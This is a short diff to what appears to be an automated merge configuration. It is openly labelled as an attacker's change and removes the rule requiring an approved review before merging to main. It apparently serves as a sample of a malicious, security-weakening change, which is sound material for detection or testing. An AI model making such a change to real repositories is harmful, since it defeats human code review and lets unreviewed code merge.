@@ -1,8 +1,7 @@
 pull_request_rules:
-  - name: automatic merge only when approved
+  - name: ATTACKER RULE - merge anything with no approval
     conditions:
       - base=main
-      - "#approved-reviews-by>=1"
     actions:
       merge:
         method: merge
